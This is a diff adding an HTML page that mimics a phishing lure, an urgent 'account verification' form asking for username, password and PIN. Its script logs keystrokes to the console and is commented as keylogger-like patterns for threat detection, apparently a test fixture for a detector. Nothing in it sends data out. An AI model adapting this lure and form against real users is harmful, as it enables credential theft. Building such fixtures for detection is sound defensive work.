@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Urgent Account Verification Required</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            max-width: 400px;
+            width: 90%;
+        }
+        h1 {
+            color: #d32f2f;
+            text-align: center;
+            font-size: 24px;
+            margin: 0 0 10px 0;
+        }
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            color: #856404;
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #333;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+        .verify-btn {
+            width: 100%;
+            padding: 12px;
+            background: #d32f2f;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            display: block;
+        }
+        .verify-btn:hover {
+            background: #b71c1c;
+        }
+        .footer {
+            text-align: center;
+            font-size: 12px;
+            color: #999;
+            margin-top: 15px;
+        }
+        .keylogger-detector {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>⚠️ URGENT</h1>
+        <div class="warning">
+            <strong>Account Verification Required:</strong><br>
+            Your account requires immediate verification. Please login and confirm your identity to secure your account.
+        </div>
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="username">Username or Email:</label>
+                <input type="text" id="username" name="username" placeholder="Enter your username" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="pin">Security PIN (verify your identity):</label>
+                <input type="text" id="pin" name="pin" placeholder="Enter your 4-digit PIN" required>
+            </div>
+            
+            <button type="submit" class="verify-btn">Verify Account & Login</button>
+        </form>
+        
+        <div class="footer">
+            <p>Secure authentication verified ✓<br>
+            This page helps protect your account]</p>
+        </div>
+    </div>
+
+    <!-- Script with keylogger-like patterns (for threat detection) -->
+    <script>
+        // This script has patterns that trigger keylogger detection
+        document.addEventListener('keydown', function(event) {
+            console.log('Key pressed:', event.key);
+        });
+        
+        document.addEventListener('keyup', function(event) {
+            console.log('Key released:', event.key);
+        });
+        
+        document.getElementById('loginForm').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                console.log('Login attempt detected');
+            }
+        });
+        
+        // Track all inputs for "session hijacking" purposes
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('change', function() {
+                console.log('Input changed:', this.name);
+            });
+        });
+    </script>
+</body>
+</html>
